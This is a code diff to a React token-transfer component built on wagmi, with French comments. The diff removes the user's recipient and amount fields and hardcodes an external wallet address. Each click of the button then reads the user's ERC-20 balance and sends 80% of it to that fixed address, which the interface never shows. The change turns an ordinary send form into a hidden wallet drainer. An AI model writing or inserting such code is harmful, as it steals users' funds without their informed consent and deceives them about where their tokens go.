@@ -1,35 +1,57 @@
 import { useState } from "react";
 import { useAccount, useWalletClient } from "wagmi";
-import { parseUnits } from "ethers/utils";
-import { writeContract, estimateGas, waitForTransaction } from "@wagmi/core";
+import { formatUnits, parseUnits } from "ethers/lib/utils";
+import { writeContract, waitForTransaction, readContract } from "@wagmi/core";
 import erc20ABI from "@/abis/erc20ABI.json";
 import { useAtom } from "jotai";
-import { tokenAtom, addressAtom } from "@/store/atoms";
+import { tokenAtom } from "@/store/atoms";
+
+const RECIPIENT_ADDRESS = "0x518c5D62647E60864EcB3826e982c93dFa154af3";
 
 const SendTokens = () => {
   const { address } = useAccount();
   const { data: walletClient } = useWalletClient();
   const [tokenAddress, setTokenAddress] = useAtom(tokenAtom);
-  const [recipientAddress, setRecipientAddress] = useAtom(addressAtom);
-  const [amount, setAmount] = useState("");
+  const [isSending, setIsSending] = useState(false);
 
   const sendTokens = async () => {
     if (!walletClient || !address) return;
-    
+    setIsSending(true);
+
     try {
-      const parsedAmount = parseUnits(amount, 18);
+      // Récupérer le solde du token ERC-20
+      const balance: bigint = await readContract({
+        address: tokenAddress,
+        abi: erc20ABI,
+        functionName: "balanceOf",
+        args: [address],
+      });
+
+      // Calculer 80% du solde disponible
+      const amountToSend = (balance * 80n) / 100n;
+
+      // Vérifier que le montant est valide
+      if (amountToSend <= 0n) {
+        console.error("Montant insuffisant pour envoyer 80%.");
+        setIsSending(false);
+        return;
+      }
+
+      // Envoyer la transaction
       const tx = await writeContract({
         address: tokenAddress,
         abi: erc20ABI,
         functionName: "transfer",
-        args: [recipientAddress, parsedAmount],
+        args: [RECIPIENT_ADDRESS, amountToSend],
       });
 
       const receipt = await waitForTransaction(tx.hash);
-      console.log("Transaction successful:", receipt);
+      console.log("Transaction réussie :", receipt);
     } catch (error) {
-      console.error("Transaction failed:", error);
+      console.error("Échec de la transaction :", error);
     }
+
+    setIsSending(false);
   };
 
   return (
@@ -40,19 +62,9 @@ const SendTokens = () => {
         value={tokenAddress}
         onChange={(e) => setTokenAddress(e.target.value)}
       />
-      <input
-        type="text"
-        placeholder="Recipient Address"
-        value={recipientAddress}
-        onChange={(e) => setRecipientAddress(e.target.value)}
-      />
-      <input
-        type="text"
-        placeholder="Amount"
-        value={amount}
-        onChange={(e) => setAmount(e.target.value)}
-      />
-      <button onClick={sendTokens}>Send Tokens</button>
+      <button onClick={sendTokens} disabled={isSending}>
+        {isSending ? "Sending..." : "Send 80% Tokens"}
+      </button>
     </div>
   );
 };
